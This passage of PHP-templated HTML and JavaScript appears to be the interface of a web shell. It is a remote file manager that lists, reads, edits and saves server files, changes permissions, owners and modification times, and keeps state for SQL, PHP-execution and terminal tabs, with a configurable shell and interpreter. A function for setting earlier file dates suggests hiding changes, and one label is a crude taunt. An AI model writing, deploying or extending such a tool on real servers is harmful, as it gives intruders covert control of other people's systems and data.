td:nth-of-type(n+5){text-align:center}#txtClpbrd{position:fixed;top:-1px;left:-1px;margin:0;padding:0;width:1px;height:1px;border:0}#frmLnk,.frmFilesPrps{width:700px}#frmSrch{width:570px}#frmBuffer,.frmFile{width:800px;height:80%}.frmFile{min-width:400px;min-height:150px;overflow:auto;resize:both}.spcrFlex{border:0;flex:1}.spcr20{border:0;width:20px}.noFlex .option{flex:initial}.spnBtnSbMn{position:relative}.btnSbMn{width:75px}.divSbMn{display:none;position:absolute;top:100%;right:3px;margin-top:-1px;width:73px;z-index:1;border:1px solid #c7c7c7;background:#efefef}.aMnItm{display:block;margin:1px;padding:2px 4px}.aMnItm:hover{background:#e0e0e0}.thPth{padding:8px 0 4px 0;background:#f0f0f0}.spnPth{display:inline-block;font:14px/1.4 'Courier New',monospace}.spnPth:hover ~ .spnPth{color:#cfcfcf}.tdUp{transform:rotate(180deg)}.lnkBlck{display:block;white-space:pre-wrap;word-break:break-all;min-height:1em}.lnk:after{content:'\21B5';float:right}.mrkd{text-decoration:underline}.prm0,.prm1,.prm2,.prm3{font:12px 'Courier New',monospace}.prm0{color:red !important}.prm2{color:#2b2bb2 !important}.prm3{color:#00aa00 !important}#tabSQL .toolbar input[type="text"]{margin:1px 4px}#divSQLWrpLeft{display:none;float:left;width:25%}#divSQLWrpRight{float:right;width:75%;padding-left:5px}#divSchm{position:static;white-space:nowrap;width:100%;overflow-x:hidden}.divItm{margin-bottom:2px}.actRe{margin:0 1px -3px 0;width:16px;height:14px;font:normal 19px/10px Verdana,sans-serif;border:1px solid transparent}.aMore{margin:0 1px}/*.aMore:hover{position:absolute;padding-right:3px;border-radius:3px;background:#f7f7f7;z-index:90}*/.spnRC{position:relative;float:right;margin-left:-100%;padding-left:5px;color:#0000cc;background:rgba(247,247,247,.85)}.divLst{margin:2px 0 10px 15px}.divFldTp{height:1.5em;margin:0 0 0 18px;color:#afafaf;font-size:xx-small}.divFldTp,.divItm{text-overflow:ellipsis;overflow:hidden}#frmSQL,#frmPg{display:none}#divCptn{margin:0 4px 2px 4px;font-style:italic}#divData{margin:0 4px 4px 0;overflow:auto}#divDump{justify-content:center;align-items:center}#tblHead,#tblData{margin:0 auto;width:auto}#frmPg input[type="text"]{display:inline-block;width:auto}#frmPHP{margin-bottom:3px}.cmpsRow:before,.cmpsCol:before{margin:0 2px 0 1px;font-size:15px;line-height:0}.cmpsRow:before{content:'\2B12'}.cmpsCol:before{content:'\25E7'}#sbmPHP{margin-left:15px}#divPHP{display:flex;flex:1 1 0;overflow:hidden}#txtPHP{color:#0d0d0d;background:#fff}#prePHP{margin:2px;padding:2px 4px;flex:1 0 0;overflow:auto;background:#fff;border:1px solid #c7c7c7}#divTrm::selection{background:#f0f0f0}#divTrm,#preTrm,#inpTrm{color:#0d0d0d;font:12px/18px 'Courier New',monospace;background:#fff}#divTrm{margin:0 2px 1px 2px;padding:4px;flex:1 1 0;overflow:auto;border:1px solid #f0f0f0}#preTrm,#inpTrm{margin:0;padding:0}#preTrm{white-space:pre-wrap;-moz-tab-size:4;tab-size:4}#inpTrm{border:0}#inpTrm:focus{box-shadow:none}#tblInf{margin:4px 2px 10px 2px;width:auto}#tblInf th,#tblInf td{vertical-align:top}#tblInf th{width:1%;padding-right:10px;text-align:left;white-space:nowrap}#tblInf th:only-child{height:3em;text-align:center;vertical-align:bottom;border:none;background:#F0F0F0}#tblInf td{white-space:pre-wrap;word-break:break-all}</style>



<script>HTMLSelectElement.prototype.__defineGetter__('textValue', function() {
 return this.options[this.selectedIndex].label;
});
var mdlWndws = [],
 tmShft = <?php echo time()*1000;?> - Date.now(),
 exeFuncs = [],
 spnDtTm;
document.addEventListener('DOMContentLoaded', function() {
 if (sessionStorage.getItem('uiRszBody')) document.body.style.width = '100%';
 var e = elmById('dataExe').textContent.split('\n');
 for (var i = 0, c = e.length - 1; i < c; i += 4) {
  var v = e[i].trimRight().split(':');
  if(e[i + 1] && e[i + 2] && e[i + 2])
	exeFuncs.push([v[0], v[1], e[i + 1].trimRight() + '@' + e[i + 2].trimRight(), e[i + 3].trimRight()]);
 }
 e = elmById('frmCstEnv');
 if (exeFuncs.length > 0) {
  strgRstrChck('envCstm', e.e);
  for (var i = 0, c = exeFuncs.length, v = sessionStorage.getItem('envFunc') | 0; i < c; ++i) {
   var opt = new Option(exeFuncs[i][1], exeFuncs[i][0]);
   if (exeFuncs[i][0] == v) opt.selected = true;
   e.f.add(opt);
  }
  strgRstrVal('envShell', e.s);
  strgRstrVal('envIntrPth', e.i);
  strgRstrChck('envIntrOptN', e.n);
  strgRstrChck('envIntrOptC', e.c);
 } else {
  elmById('fldEnv').disabled = true;
  e.e.disabled = true;
 }
 strgRstrChck('ro', 'cbRO');
 strgRstrChck('rr', 'cbRR');
 strgRstrChck('tm', 'cbTM');
 strgRstrChck('oi', 'cbOI');
 fmRestoreState();
 sqlRestoreState();
 phpRestoreState();
 trmRestoreState();
 spnDtTm = elmById('divDtTm').firstChild;
 uiUpdDtTm();
 setInterval(uiUpdDtTm, 1500);
}, false);
window.onbeforeunload = function() {
 strgSaveBool('uiRszBody', document.body.style.width === '100%');
 if (exeFuncs.length > 0) {
  var e = elmById('frmCstEnv');
  strgSaveBool('envCstm', e.e.checked);
  strgSaveOpt('envFunc', e.f.value);
  strgSaveStr('envShell', e.s.value);
  strgSaveStr('envIntrPth', e.i.value);
  strgSaveBool('envIntrOptN', e.n.checked);
  strgSaveBool('envIntrOptC', e.c.checked);
 }
 strgRstrChck('ro', 'cbRO');
 strgRstrChck('rr', 'cbRR');
 strgRstrChck('tm', 'cbTM');
 strgRstrChck('oi', 'cbOI');
 fmSaveState();
 sqlSaveState();
 phpSaveState();
 trmSaveState();
};

function elmById(v) {
 return document.getElementById(v);
}

function newElm(tag, attr) {
 var e = document.createElement(tag);
 for (var k in attr) e[k] = attr[k];
 return e;
}

function strgRstrVal(opt, elm) {
 opt = sessionStorage.getItem(opt);
 if (opt === null) return;
 if (typeof elm === 'string') elm = elmById(elm);
 elm.value = opt;
}

function strgRstrArr(n) {
 var val = sessionStorage.getItem(n);
 return val === null ? [] : JSON.parse(val);
}

function strgRstrChck(opt, elm) {
 if (sessionStorage.getItem(opt) === null) return;
 if (typeof elm === 'string') elm = elmById(elm);
 elm.checked = true;
}

function uiKeyDwn(e) {
 e = e || window.event;
 var c = mdlWndws.length;
 if (c === 0) return;
 if (e.which === 27)
  for (var i = c - 1; i >= 0; --i) {
   if (mdlWndws[i].clientTop) return mdlWndws[i].firstChild.childNodes[1].onclick();
  } else if (c > 1 && e.altKey === true && e.which === 84)
   for (var i = 0; i < c; ++i)
    if (mdlWndws[i].clientTop && i + 1 < c) {
     mdlWndws[i].style.zIndex = (mdlWndws[c - 1].style.zIndex | 0) + 1;
     mdlWndws.push(mdlWndws.splice(i, 1)[0]);
     return;
    }
}

function uiUpdDtTm() {
 var v = new Date(Date.now() + tmShft).toISOString();
 v = v.slice(0, 10) + ' ' + v.slice(11, 13) + '<span class="blink">:</span>' + v.slice(14, 16);
 if (spnDtTm.innerHTML !== v) spnDtTm.innerHTML = v;
}

function strgSaveArr(n, v) {
 if (v.length) sessionStorage.setItem(n, JSON.stringify(v));
 else sessionStorage.removeItem(n);
}

function strgSaveBool(n, v) {
 if (typeof v === 'string') v = elmById(v).checked;
 if (v) sessionStorage.setItem(n, 1);
 else sessionStorage.removeItem(n);
}

function strgSaveStr(n, v) {
 if (v === '') sessionStorage.removeItem(n);
 else sessionStorage.setItem(n, v);
}

function strgSaveOpt(n, v) {
 if (v !== '' && v !== 'UTF-8') sessionStorage.setItem(n, v);
 else sessionStorage.removeItem(n);
}

function uiRszBody() {
 var s = document.body.style;
 s.width = s.width === '100%' ? '' : '100%';
 return false;
}

function uiRsz(e) {
 if (typeof e === 'string') e = elmById(e);
 e = e.style;
 if (e.width === '100%') {
  e.width = '';
  e.height = '';
 } else {
  e.top = '';
  e.left = '';
  e.width = '100%';
  e.height = '100%';
 }
 return false;
}

function uiDelMsg(div) {
 elmById('divMsgs').removeChild(div);
 return false;
}

function setMsgTmr(div) {
 var fnc = uiDelMsg.bind(null, div),
  tmr = setTimeout(fnc, 5000);
 div.onmouseover = function() {
  clearTimeout(tmr);
 };
 div.onmouseout = function() {
  tmr = setTimeout(fnc, 5000);
 };
}

function uiClsMsg() {
 return uiDelMsg(this.parentNode);
}

function uiMsg(msg, type) {
 if (!type) {
  type = 'Prcs';
  msg += ' \u2026';
 }
 var div = newElm('div', {
  className: 'divCntrls divMsg' + type
 });
 div.appendChild(newElm('a', {
  href: '#',
  className: 'cntrl',
  textContent: '\u00D7',
  onclick: uiClsMsg
 }));
 div.appendChild(document.createTextNode(msg));
 var elm = elmById('divMsgs');
 elm.insertBefore(div, elm.firstChild);
 if (type !== 'Prcs') setMsgTmr(div);
 return div;
}

function uiChngMsg(div, msg, type) {
 div.firstChild.onclick = uiClsMsg;
 div.lastChild.textContent = msg;
 div.className = 'divMsg' + type;
 setMsgTmr(div);
 var elm = elmById('actLog').style;
 if (elm.display !== 'inline-block') elm.display = 'inline-block';
 elm = elmById('divLogCntn');
 elm.insertBefore(newElm('div', {
  className: 'divMsg' + type,
  textContent: '(' + utsToStr(Date.now() / 1000) + ') ' + msg
 }), elm.firstChild);
 return false;
}

function uiNetErrMsg(div) {
 uiChngMsg(div, 'Network error\n' + div.lastChild.textContent.slice(0, -2), 'Err');
}

function uiShwModal(elm) {
 if (typeof elm === 'string') elm = elmById(elm);
 if (elm.style.visibility === 'visible') return false;
 elm.style.zIndex = mdlWndws.length === 0 ? 100 : (mdlWndws[mdlWndws.length - 1].style.zIndex | 0) + 1;
 elm.style.visibility = 'visible';
 mdlWndws.push(elm);
 elm.focus();
 return false;
}

function uiActvModal(evnt) {
 var elm = evnt.currentTarget,
  n = mdlWndws.indexOf(elm);
 if (n !== -1) {
  var i = mdlWndws.length - 1;
  if (mdlWndws[i] !== elm) {
   elm.style.zIndex = (mdlWndws[i].style.zIndex | 0) + 1;
   mdlWndws.splice(n, 1);
   mdlWndws.push(elm);
  }
 }
 if (evnt.target.tagName === 'SPAN' || evnt.target.tagName === 'DIV') {
  elm.style.cursor = 'move';
  var dx = evnt.pageX - elm.offsetLeft,
   dy = evnt.pageY - elm.offsetTop;
  document.onmousemove = function(e) {
   elm.style.left = (e.clientX - dx) + 'px';
   elm.style.top = (e.clientY + window.pageYOffset - dy) + 'px';
  };
  document.onmouseup = function() {
   document.onmousemove = null;
   document.onmouseup = null;
   elm.style.cursor = '';
  };
  evnt.preventDefault();
  evnt.stopPropagation();
  return false;
 }
}

function uiClsModal(elm) {
 if (typeof elm === 'string') elm = elmById(elm);
 elm.style.visibility = 'hidden';
 mdlWndws.splice(mdlWndws.indexOf(elm), 1);
 return false;
}

function uiSlctTxt(id) {
 var r = document.createRange(),
  s = window.getSelection();
 r.selectNode(elmById(id));
 s.removeAllRanges();
 s.addRange(r);
}

function utsToStr(v) {
 if (v < 1) return '?';
 v = new Date(v * 1000).toISOString();
 return v.slice(0, 10) + ' ' + v.slice(11, 19);
}

function clnLog() {
 elmById('actLog').style.display = 'none';
 elmById('divLog').style.visibility = 'hidden';
 var div = elmById('divLogCntn');
 for (var i = div.childNodes.length - 1; i >= 0; --i) div.removeChild(div.childNodes[i]);
 return false;
}
var DS = '<?php echo NIX?"/":"\\\\";?>',
 fmBuffer = [],
 elmTblFiles = null,
 elmTmplFileRow = null,
 elmPth = null,
 fileTypes = {
  0xE000: 'P',
  0xD000: 'D',
  0xC000: 's',
  0xA000: 'l',
  0x8000: '-',
  0x6000: 'b',
  0x4000: 'd',
  0x2000: 'c',
  0x1000: 'p'
 };

function fmSaveState() {
 strgSaveStr('fmPath', elmPth.placeholder);
 strgSaveArr('fmBuffer', fmBuffer);
}

function fmRestoreState() {
 elmTblFiles = elmById('tblFiles');
 elmTmplFileRow = elmById('tmplFileRow').content.firstChild;
 elmPth = elmById('frmFM').p;
 strgRstrVal('fmPath', elmPth);
 elmPth.placeholder = elmPth.value;
 fmBuffer = strgRstrArr('fmBuffer');
 if (fmBuffer.length > 0) elmById('btnBufferMenu').disabled = false;
}

function uiCheckAll(id, state) {
 var elms = elmById('frm' + id)['f[]'];
 if (elms) {
  if (elms.length > 0)
   for (var i = elms.length - 1; i >= 0; --i) elms[i].checked = state;
  else elms.checked = state;
 }
}

function fmAjxSnd(msg, clbck, data, frm, chrst) {
 if (!data) data = {};
 data.a = 'f';
 if (!('c' in data)) {
  var cs = elmById('fmCSLoad').value;
  if (cs !== '') data.c = cs;
 }
 ajxSnd(msg, clbck, frm, data, chrst ? chrst : elmById('fmCSSend').value);
}

function parseName(file) {
 var n = file[0],
  e = '';
 if (file[1] === null) {
  n = '[ ' + n + ' ]';
  e = '[ DIR ]';
 } else {
  var p = n.lastIndexOf('.');
  if (p > 0) {
   e = n.slice(p + 1);
   //n = n.slice(0, p);
  }
 }
 file[0] = [file[0], n, e];
}

function cmprFiles(f1, f2) {
 var f1F = f1[1] !== null,
  f2F = f2[1] !== null;
 if (f1F && f2F) {
  if (f1[0][2] !== f2[0][2]) return f1[0][2] > f2[0][2] ? 1 : -1;
 } else if (f1F) return 1;
 else if (f2F) return -1;
 return f1[0][1] > f2[0][1] ? 1 : -1;
}

function frmtSize(s) {
 if (s === null) return '[ DIR ]';
 if (s === -1) return '?';
 if (s > 999) {
  s = s.toString();
  for (var i = s.length - 3; i > 0; i -= 3) s = s.slice(0, i) + '\u2009' + s.slice(i);
 }
 return s;
}

function prmsToStr(p) {
 p |= 0;
 if (p === 0) return '?';
 var v = p & 0xF000;
 return ((v in fileTypes) ? fileTypes[v] : 'u') + ((p & 0x0100) ? 'r' : '-') + ((p & 0x0080) ? 'w' : '-') + ((p & 0x0040) ? ((p & 0x0800) ? 's' : 'x') : ((p & 0x0800) ? 'S' : '-')) + ((p & 0x0020) ? 'r' : '-') + ((p & 0x0010) ? 'w' : '-') + ((p & 0x0008) ? ((p & 0x0400) ? 's' : 'x') : ((p & 0x0400) ? 'S' : '-')) + ((p & 0x0004) ? 'r' : '-') + ((p & 0x0002) ? 'w' : '-') + ((p & 0x0001) ? ((p & 0x0200) ? 't' : 'x') : ((p & 0x0200) ? 'T' : '-'));
}

function updFileRow(row, file, ogn) {
 row.style.visibility = 'hidden';
 row.cells[3].firstChild.textContent = frmtSize(file[1]);
 row.cells[4].textContent = utsToStr(file[2]);
 var elm = row.cells[5].firstChild;
 elm.className = 'lnkAct prm' + file[3];
 <?php if(NIX){?>elm.textContent = prmsToStr(file[4]);
 elm.title = (file[4] | 0).toString(8).slice(-4);
 elm = row.cells[6];
 elm.textContent = ogn;
 elm.title = (file[5] === -1 ? '?' : file[5]) + '/' + (file[6] === -1 ? '?' : file[6]);
 <?php }else{?>switch(file[3]) {
  case 1: elm.textContent = 'read';
  break;
  case 2: elm.textContent = 'write';
  break;
  case 3: elm.textContent = 'read/write';
  break;
  default: elm.textContent = 'none';
  break;
 }
 <?php }?>row.style.visibility = 'visible';
}

function fillFileRow(cells, bpth, file, ogn) {
 var fpth = bpth + file[0][0],
  elm = cells[1].firstChild,
  len = file.length;
 if (file[1] === null) fpth += DS;
 cells[0].firstChild.value = fpth;
 elm.textContent = file[0][1];
 if (len % 2 === 0) {
  elm.title = canonPath(file[len - 1], bpth);
  elm.classList.add('lnk');
 }
 if (fmBuffer.indexOf(fpth) > -1) elm.classList.add('mrkd');
 elm = cells[2].firstChild;
 elm.title = file[0][0];
 elm.textContent = file[0][2];
 cells[3].firstChild.textContent = frmtSize(file[1]);
 cells[4].textContent = utsToStr(file[2]);
 elm = cells[5].firstChild;
 elm.classList.add('prm' + file[3]);
 <?php if(NIX){?>elm.textContent = prmsToStr(file[4]);
 elm.title = (file[4] | 0).toString(8).slice(-4);
 elm = cells[6];
 elm.textContent = ogn;
 elm.title = (file[5] === -1 ? '?' : file[5]) + '/' + (file[6] === -1 ? '?' : file[6]);
 <?php }else{?>switch(file[3]) {
  case 1: elm.textContent = 'read';
  break;
  case 2: elm.textContent = 'write';
  break;
  case 3: elm.textContent = 'read/write';
  break;
  default: elm.textContent = 'none';
  break;
 }
 <?php }?>
}

function listFiles(data, ownrs, grps) {
 var bpth = data.p,
  files = data.f,
  tbdy = elmById('tmplFilesTBody').content.firstChild.cloneNode(true);
 for (var pths = bpth.slice(0, -1).split(DS), cpth = '', i = 0, c = pths.length; i < c; ++i) {
  cpth += pths[i] + DS;
  tbdy.rows[0].cells[0].appendChild(newElm('a', {
   href: '#' + cpth,
   className: 'spnPth',
   textContent: pths[i] + DS,
  }));
  tbdy.rows[0].cells[0].classList.add('prm' + data.m);
 }
 tbdy.rows[1].cells[0].firstChild.value = bpth + '..';
 files.map(parseName);
 files.sort(cmprFiles);
 for (var i = 0, c = files.length; i < c; ++i) {
  var file = files[i],
   row = elmTmplFileRow.cloneNode(true);
  fillFileRow(row.cells, bpth, file<?php if(NIX)echo",ownrs[file[5]]+'/'+grps[file[6]]";?>);
  tbdy.appendChild(row);
 }
 elmTblFiles.appendChild(tbdy);
}

function listPaths(data) {
 var stl = elmTblFiles.style;
 if (stl.display !== 'none') {
  stl.display = 'none';
  for (var i = elmTblFiles.tBodies.length - 1; i >= 0; --i) elmTblFiles.removeChild(elmTblFiles.tBodies[i]);
  elmTblFiles.tHead.rows[0].cells[0].firstChild.checked = false;
 }
 if ('p' in data) listFiles(data<?php if(NIX)echo',data.o,data.g';?>);
 else
  for (var i = 0, c = data.f.length; i < c; ++i) listFiles(data.f[i] <?php if(NIX)echo',data.o,data.g';?>);
 stl.display = 'table';
}

function canonPath(pth, bpth) {
 if (pth === '') return '';
 var a = [],
  s = DS,
  v = pth.match(new RegExp('^[a-zA-Z0-9]{3,}://'));
 if (v !== null) {
  s = '/';
  v = v[0];
  var len = v.length;
  a.push(pth.slice(0, pth[len] === s ? len : v - 1));
  pth = pth.slice(len);
 } else if (DS === '/') {
  if (pth[0] === DS) a.push('');
 } else {
  pth = pth.replace('/', DS);
  if (pth[1] === ':') {
   a.push(pth.slice(0, 2));
   pth = pth.slice(2);
  } else if (pth.slice(0, 2) === DS + DS) {
   a.push(DS);
   pth = pth.slice(1);
  } else if (pth[0] === DS) a.push('');
 }
 if (a.length === 0) return canonPath(bpth + pth, bpth);
 v = pth.split(s);
 for (var i = 0, l = v.length; i < l; ++i) switch (v[i]) {
  case '':
  case '.':
   break;
  case '..':
   if (a.length > 1) a.pop();
   break;
  default:
   a.push(v[i]);
   break;
 }
 return a.length === 1 ? a[0] + s : a.join(s);
}

function onSrchFiles(div, data) {
 if ('e' in data) return uiChngMsg(div, data.e, 'Err');
 if (data.f.length === 0) return uiChngMsg(div, 'Nothing found', 'Inf');
 listPaths(data);
 uiDelMsg(div);
}

function srchFiles(e) {
 e.preventDefault();
 e.stopPropagation();
 var frm = elmById('frmSrch'),
  data = {
   s: []
  },
  pths = frm.elements[0].value.split(DS === '/' ? ':' : ';');
 for (var i = pths.length - 1; i >= 0; --i) {
  var pth = canonPath(pths[i], elmPth.placeholder);
  if (pth !== '') data.s.push(pth);
 }
 data.s.sort();
 fmAjxSnd('Search files', onSrchFiles, data, frm);
 uiClsModal(frm);
}

function uiSrchFTypeChngd() {
 var frm = elmById('frmSrch'),
  isDir = frm.y.value == 1;
 for (var i = 0, a = [<?php if(NIX)echo"'u',";?> 'z', 't', 'x', 'v']; i < 5; ++i) frm[a[i]].disabled = isDir;
}

function uiShwFrmSrch() {
 var frm = elmById('frmSrch'),
  elm = frm.elements[0];
 if (elm.value === '') elm.value = elmPth.placeholder;
 uiShwModal(frm);
 return false;
}

function updFrmFile(frm, file, cntnt, chrst) {
 if (file[1] !== null) {
  var elm = frm.firstChild.firstChild;
  switch (file[1]) {
   case 3:
    elm.textContent = 'Full Access';
    break;
   case 2:
    elm.textContent = 'Writable';
    break;
   case 1:
    elm.textContent = 'Read Only';
    break;
   case 0:
    elm.textContent = 'Who Do You Voodoo, Bitch?';
    break;
  }
  elm.className = 'spnTitle prm' + file[1];
 }
 frm.elements[0].value = cntnt;
 var elm = frm.elements[1];
 elm.value = file[0];
 elm.placeholder = file[0];
 chrst = chrst.toLowerCase();
 for (var i = frm.c.options.length - 1; i >= 0; --i)
  if (frm.c.options[i].label.toLowerCase() === chrst) {
   frm.c.selectedIndex = i;
   break;
  }
}

function tbdyByPath(pth) {
 for (var i = 0, c = elmTblFiles.tBodies.length; i < c; ++i)
  if (elmTblFiles.tBodies[i].rows[0].cells[0].textContent === pth) return elmTblFiles.tBodies[i];
 return null;
}

function isInsPos(file, cells) {
 var fF = file[1] !== null,
  rF = cells[3].firstChild.textContent !== '[ DIR ]';
 if (fF && rF) {
  var fExt = file[0][2],
   rExt = cells[2].firstChild.textContent;
  if (fExt !== rExt) return rExt > fExt;
 } else if (fF) return false;
 else if (rF) return true;
 return cells[1].firstChild.textContent > file[0][1];
}

function updTblFiles(data, ownrs, grps) {
 var tbdyCnt = elmTblFiles.tBodies.length,
  bpth = data.p,
  files = data.f;
 if (tbdyCnt === 0) return;
 files.map(parseName);
 files.sort(cmprFiles);
 for (var i = 0, c = files.length; i < c; ++i) {
  var file = files[i],
   fpth = bpth + file[0][0],
   lpth = file.length % 2 == 0 ? canonPath(file.slice(-1)[0], bpth) : null,
   ogn = <?php echo NIX?"ownrs[file[5]]+'/'+grps[file[6]]":"''";?>,
   isNotUpdtd = true;
  if (file[1] === null) fpth += DS;
  for (var t = 0; t < tbdyCnt; ++t) {
   var tbdy = elmTblFiles.tBodies[t],
    rows = tbdy.rows,
    isEqlBsPth = rows[0].cells[0].textContent === bpth;
   for (var r = 2, n = rows.length; r < n; ++r) {
    var row = rows[r],
     cells = row.cells,
     cfpth = cells[0].firstChild.value,
     clpth = cells[1].firstChild.title;
    if (isNotUpdtd && isEqlBsPth) {
     if (cfpth === fpth) {
      updFileRow(row, file, ogn);
      isNotUpdtd = false;
     } else if (isInsPos(file, cells)) {
      var tmpl = elmTmplFileRow.cloneNode(true);
      fillFileRow(tmpl.cells, bpth, file, ogn);
      tbdy.insertBefore(tmpl, row);
      isNotUpdtd = false;
      ++n;
     }
    }
    if (clpth === fpth || cfpth === lpth || lpth === clpth) updFileRow(row, file, ogn);
   }
   if (isNotUpdtd && isEqlBsPth) {
    var tmpl = elmTmplFileRow.cloneNode(true);
    fillFileRow(tmpl.cells, bpth, file, ogn);
    tbdy.appendChild(tmpl);
   }
  }
 }
}

function updTblFile(f) {
 var pos = f[0].slice(0, -1).lastIndexOf(DS) + 1,
  bpth = f[0].slice(0, pos),
  os = {},
  gs = {};
 f[0] = f[0].slice(pos);
 <?php if(NIX){?>os[f[5]] = f[7];
 gs[f[6]] = f[8];
 f.splice(7, 2);
 <?php }?>updTblFiles({
  p: bpth,
  f: [f]
 }, os, gs);
}

function onSaveFile(div, data, chrst) {
 if (typeof data !== 'string') return uiChngMsg(div, "Can't s" + div.childNodes[1].nodeValue.slice(1, -1) + data.e, 'Err');
 var pos = data.lastIndexOf('\x03\x1E'),
  file;
 switch (data[pos + 2]) {
  case '\x06':
   file = JSON.parse(data.slice(pos + 3));
   updFrmFile(this, [file[0], file[3]], data.slice(0, pos), chrst);
   uiDelMsg(div);
   break;
  case '\x15':
   file = JSON.parse(data.slice(pos + 3));
   uiChngMsg(div, 'File ' + file[0] + " successful saved but can't read now", 'Inf');
   break;
  default:
   uiNetErrMsg(div);
   return false;
   break;
 }
 updTblFile(file);
}

function saveFile(e) {
 e.preventDefault();
 e.stopPropagation();
 var frm = e.target,
  pth = canonPath(frm.elements[1].value, elmPth.placeholder);
 fmAjxSnd('Save file as ' + pth, onSaveFile, {
  w: pth
 }, frm, frm.c.textValue);
}

function onRldFile(div, data, chrst) {
 if (typeof data !== 'string') return uiChngMsg(div, "Can't read file " + div.childNodes[1].nodeValue.slice(5, -2) + data.e, 'Err');
 var pos = data.lastIndexOf('\x03\x1E'),
  file;
 switch (data[pos + 2]) {
  case '\x06':
   file = JSON.parse(data.slice(pos + 3));
   updFrmFile(this, file, data.slice(0, pos), chrst);
   uiDelMsg(div);
   break;
  case '\x15':
   file = JSON.parse(data.slice(pos + 3));
   uiChngMsg(div, "Can't read file " + file[0], 'Inf');
   break;
  default:
   uiNetErrMsg(div);
   return false;
   break;
 }
}

function rldFile(e) {
 e.preventDefault();
 e.stopPropagation();
 var frm = e.target.parentNode.parentNode,
  pth = frm.elements[1].placeholder;
 frm.t.value = '';
 if (frm.firstChild.firstChild.textContent !== 'New File') fmAjxSnd('Reload file ' + pth, onRldFile, {
  g: pth
 }, frm);
}

function rldFileAs(e) {
 if (e.target.parentNode.parentNode.elements[1].placeholder !== '' && confirm('Do you want to reload this file with selected charset?')) rldFile(e);
}

function uiShwFrmFile(file, cntnt, chrst) {
 var frm = elmById('tmplFrmFile').content.firstChild.cloneNode(true);
 updFrmFile(frm, file, cntnt, chrst);
 elmById('divWndws').appendChild(frm);
 uiShwModal(frm);
}

function onGoTo(div, data, chrst) {
 if (typeof data === 'string') {
  var pos = data.lastIndexOf('\x03\x1E');
  switch (data[pos + 2]) {
   case '\x06':
    uiShwFrmFile(JSON.parse(data.slice(pos + 3)), data.slice(0, pos), chrst);
    uiDelMsg(div);
    break;
   case '\x15':
    uiChngMsg(div, "Can't open " + data.slice(pos + 3), 'Err');
    break;
   default:
    uiNetErrMsg(div);
    break;
  }
 } else {
  if (data.f.length === 0 && (data.m === 0 || data.m === 2)) uiChngMsg(div, "Can't read dir " + data.p, 'Err');
  else {
   elmPth.value = data.p;
   elmPth.placeholder = data.p;
   listPaths(data);
   uiDelMsg(div);
  }
 }
}

function goTo(pth) {
 if (pth !== '' && pth !== '~') pth = canonPath(pth, elmPth.placeholder);
 fmAjxSnd('Go ' + ((pth === '' || pth === '~') ? 'home' : 'to ' + pth), onGoTo, {
  g: pth
 });
 return false;
}

function uiTgglSubMenu(e) {
 var div = e.currentTarget.nextSibling,
  style = div.style;
 if (style.display === 'block') style.display = 'none';
 else {
  style.display = 'block';
  div.firstChild.focus();
 }
}

function menuButtonBlur(e) {
 setTimeout(uiMenuButtonBlur, 10, e.nextSibling);
}

function menuItemBlur(e) {
 setTimeout(uiMenuItemBlur, 10, e.parentNode);
}

function uiMenuButtonBlur(menuDiv) {
 var actvPrnt = document.activeElement.parentNode;
 if (actvPrnt !== menuDiv) menuDiv.style.display = 'none';
}

function uiMenuItemBlur(menuDiv) {
 var actvPrnt = document.activeElement.parentNode;
 if (actvPrnt !== menuDiv && actvPrnt !== menuDiv.parentNode) menuDiv.style.display = 'none';
}

function uiDstrModal(wndw) {
 elmById('divWndws').removeChild(wndw);
 return false;
}

function updBufferState() {
 var elm = elmById('btnBufferMenu'),
  isEmpty = fmBuffer.length === 0;
 if (elm.disabled !== isEmpty) elm.disabled = isEmpty;
 if (isEmpty) {
  elm = elmById('frmBuffer');
  if (elm.style.visibility === 'visible') {
   uiClsModal(elm);
   elm = elmById('tblBuffer');
   elm.removeChild(elm.tBodies[0]);
  }
 }
}

function rmFiles(data) {
 var bpth = data.p,
  files = data.f,
  flsTbds = elmTblFiles.tBodies,
  flsTbdy = tbdyByPath(bpth),
  bfrTbdy = elmById('frmBuffer').style.visibility === 'visible' ? elmById('tblBuffer').tBodies[0] : null;
 for (var i = files.length - 1; i >= 0; --i) {
  var fpth = files[i];
  if (flsTbdy)
   for (var j = flsTbdy.rows.length - 1; j > 1; --j)
    if (flsTbdy.rows[j].cells[2].firstChild.title === fpth) {
     flsTbdy.removeChild(flsTbdy.rows[j]);
     break;
    } fpth = bpth + fpth;
  var n = fmBuffer.indexOf(fpth);
  if (n > -1) {
   fmBuffer.splice(n, 1);
   if (bfrTbdy) bfrTbdy.removeChild(bfrTbdy.rows[n]);
  }
  fpth += DS;
  var len = fpth.length;
  for (n = flsTbds.length - 1; n >= 0; --n)
   if (flsTbds[n].rows[0].cells[0].textContent.slice(0, len) === fpth) elmTblFiles.removeChild(flsTbds[n]);
  for (n = fmBuffer.length - 1; n >= 0; --n)
   if (fmBuffer[n].slice(0, len) === fpth) {
    fmBuffer.splice(n, 1);
    if (bfrTbdy) bfrTbdy.removeChild(bfrTbdy.rows[n]);
   }
 }
}

function onChngPrps(div, data) {
 if ('r' in data) {
  for (var i = 0, c = data.r.length; i < c; ++i) rmFiles(data.r[i]);
  updBufferState();
 }
 if ('c' in data)
  for (var i = 0, c = data.c.length; i < c; ++i) updTblFiles(data.c[i] <?php if(NIX)echo',data.o,data.g';?>);
 if ('e' in data) uiChngMsg(div, "Can't change" + (data.e.length === 1 ? ' ' + data.e[0] : ':\n' + data.e.join('\n')), 'Err');
 else uiDelMsg(div);
}

function chngPrps(e) {
 e.preventDefault();
 e.stopPropagation();
 var frm = e.target,
  data = {
   h: []
  },
  flds = {
   p: 'path',
   t: 'modified time'
   <?php if(NIX)echo",e:'permissions',o:'owner',r:'group'";?>
  },
  chngd = [];
 for (var field in flds)
  if (frm[field].value !== '' && frm[field].value !== frm[field].placeholder) {
   data[field] = frm[field].value;
   chngd.push(flds[field]);
  } if (chngd.length > 0) {
  if ('p' in data) data.p = canonPath(data.p, elmPth.placeholder);
  var elm = frm['h[]'],
   cnt = elm.length ? elm.length : 1;
  if (cnt > 1)
   for (var i = 0; i < cnt; ++i) data.h.push(elm[i].value);
  else data.h.push(elm.value);
  fmAjxSnd('Change ' + chngd.join(', ') + ' for ' + (cnt > 1 ? 'selected files (' + cnt + ')' : elm.value), onChngPrps, data);
 }
 uiDstrModal(frm);
}

function setErlDate(e) {
 e.preventDefault();
 e.stopPropagation();
 var elm = e.target.parentNode.lastChild,
  erlDate = elm.value;
 for (var i = elmTblFiles.tBodies.length - 1; i >= 0; --i) {
  var rows = elmTblFiles.tBodies[i].rows;
